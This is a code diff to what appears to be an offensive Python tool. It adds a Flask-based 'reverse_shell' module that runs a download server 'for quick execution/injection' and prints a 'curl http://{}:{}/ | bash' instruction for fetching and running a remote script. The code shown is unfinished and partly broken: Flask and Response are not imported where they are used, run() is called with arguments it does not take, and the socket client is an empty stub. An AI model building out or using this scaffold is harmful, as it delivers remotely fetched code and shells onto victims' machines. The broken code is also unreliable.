@@ -1,5 +1,6 @@
 import modules.plugin as plugin
 from os import system
+import threading
 import sys
 
 class colors:
@@ -105,10 +106,73 @@ class essensials:
             else: return False
         return a
 
+class EndpointAction(object):
+    """
+    https://stackoverflow.com/questions/40460846/using-flask-inside-class
+    """
+
+    def __init__(self, action):
+        self.action = action
+        self.response = Response(status=200, headers={})
+
+    def __call__(self, *args):
+        self.action()
+        return self.response
+
+
+class FlaskAppWrapper(object):
+    """
+    https://stackoverflow.com/questions/40460846/using-flask-inside-class
+    """
+    app = None
+
+    def __init__(self, name):
+        self.app = Flask(name)
+
+    def run(self):
+        self.app.run()
+
+    def add_endpoint(self, endpoint=None, endpoint_name=None, handler=None):
+        self.app.add_url_rule(endpoint, endpoint_name, EndpointAction(handler))
+
 class modules:
     """
     built in scripts and stuff
     """
+    class reverse_shell:
+        def flaskThread(a, ip, port:int):
+            a.run(ip, port=port)
+
+        def download():
+            """
+            flask download handler
+            """
+            return "no"
+
+        def initDownload(args:list):
+            """
+            execute the download server for quick execution/injection
+            """
+            try:
+                from flask import Flask
+            except ImportError:
+                print("[!] flask needed for script download; skipping...")
+                return
+
+            a = FlaskAppWrapper('wrap')
+            a.add_endpoint(endpoint='/', endpoint_name='main', handler=modules.reverse_shell.download)
+
+            threading.Thread(target=modules.reverse_shell.flaskThread, args=(a, args[1], args[2],), daemon=True).start()
+
+            print("[+] started flask download server!\n  \\ use \"curl http://{}:{}/ | bash\" to run script")
+
+        def initSocket(args:list):
+            """
+            main TCP socket client
+            """
+
+
+            
     class dns:
         def start(args:list):
             try:
